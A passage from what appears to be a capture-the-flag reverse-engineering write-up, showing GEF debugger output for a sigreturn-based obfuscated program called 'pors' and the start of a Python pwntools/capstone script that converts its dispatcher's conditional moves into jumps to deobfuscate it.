style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rip\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0000000013370000\u003c/span\u003e  \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e0x4801c08348d08948\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r8\u003c/span\u003e    : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r9\u003c/span\u003e    : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r10\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r11\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r12\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r13\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r14\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$r15\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$eflags: \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ezero\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ecarry\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eparity\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eadjust\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003esign\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrap\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINTERRUPT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edirection\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoverflow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eresume\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evirtualx86\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eidentification\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$cs: \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex33\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e$ss\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x2b\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e$ds\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x00\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e$es\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x00\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e$fs\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x00\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e$gs\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x00\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estack\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420000\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0000\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\t \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e$rsp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420008\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0008\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420010\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0010\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420018\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0018\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420020\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0020\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420028\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0028\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420030\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0030\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex0000000042420038\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x0038\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e code:x86:\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e64\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex13370000\u003c/span\u003e                  \u003cspan style=\"color:#66d9ef\"\u003emov\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003erdx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex13370003\u003c/span\u003e                  \u003cspan style=\"color:#66d9ef\"\u003eadd\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex13370007\u003c/span\u003e                  \u003cspan style=\"color:#66d9ef\"\u003eimul\u003c/span\u003e   \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex1337000e\u003c/span\u003e                  \u003cspan style=\"color:#66d9ef\"\u003eadd\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003ersp\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex13370011\u003c/span\u003e                  \u003cspan style=\"color:#66d9ef\"\u003emov\u003c/span\u003e    \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex13370018\u003c/span\u003e                  \u003cspan style=\"color:#66d9ef\"\u003esyscall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ethreads\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e#0] Id 1, Name: \u0026#34;pors\u0026#34;, stopped 0x13370000 in ?? (), reason: SINGLE STEP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e#0] 0x13370000  mov rax, rdx\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003egef\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eHere, I set a breakpoint right after the first syscall in the pors program. We can see that for rsp 0x42420000, the recovered stack frame has an rip register pointing to the code at 0x13370000. This block is therefore the dispatcher.\u003c/p\u003e\n\u003cp\u003eLooking more closely at the dispatcher block, we can see that it uses the rax register to calculate the address of the next fake frame, and that in some blocks we have conditional mov instructions, which will either set rax with the value of rbx or keep the base value of rax, which looks like an if/else structure.\u003c/p\u003e\n\u003ch2 id=\"deobfuscate\"\u003eDeobfuscate\u003c/h2\u003e\n\u003cp\u003eTo deobfuscate this program, we need to emulate the dispatcher in order to replace the syscalls in each block with simple jmp instructions.\u003c/p\u003e\n\u003cp\u003eFor this, I wrote a Python script to obtain the real program stored in program.bin:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e pwn \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e capstone \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFRAME_SIZE \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCODE_START_ADDR \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x13370000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCODE_BLOCK_SIZE \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecmov_to_jmp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovne\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jne\u0026#39;\u003c/span\u003e,   \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmove\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;je\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovg\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jg\u0026#39;\u003c/span\u003e,     \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovl\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jl\u0026#39;\u003c/span\u003e,     \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovle\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jle\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovge\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jge\u0026#39;\u003c/span\u003e,   \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmova\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ja\u0026#39;\u003c/span\u003e,     \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovb\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jb\u0026#39;\u003c/span\u003e,     \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovae\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jae\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovbe\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jbe\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovs\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;js\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovns\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jns\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovo\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jo\u0026#39;\u003c/span\u003e,     \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovno\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jno\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovc\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jc\u0026#39;\u003c/span\u003e,     \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovnc\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jnc\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovz\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jz\u0026#39;\u003c/span\u003e,     \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovnz\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jnz\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovp\u0026#39;\u003c/span\u003e:  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jp\u0026#39;\u003c/span\u003e,    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cmovnp\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;jnp\u0026#39;\u003c/span\u003e, \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emd \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Cs(CS_ARCH_X86, CS_MODE_64)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Reading sections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;program.bin\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;rb\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    code_section_size \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread(\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e), \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    code_section \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread(code_section_size)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frame_section_size \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread(\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e), \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frame_section \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread(frame_section_size)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enb_frames \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e frame_section_size \u003cspan style=\"color:#f92672\"\u003e//\u003c/span\u003e FRAME_SIZE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eframes_list \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [SigreturnFrame(arch\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;amd64\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(nb_frames)]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecouple_frame_code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eoffset \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(nb_frames):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    offset \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003eFRAME_SIZE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er8 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x28\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x30\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    frames_list[i]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003er9 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(frame_section[offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x30\u003c/span\u003e : offset\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x38\u003c/span\u003e], \u003cspan 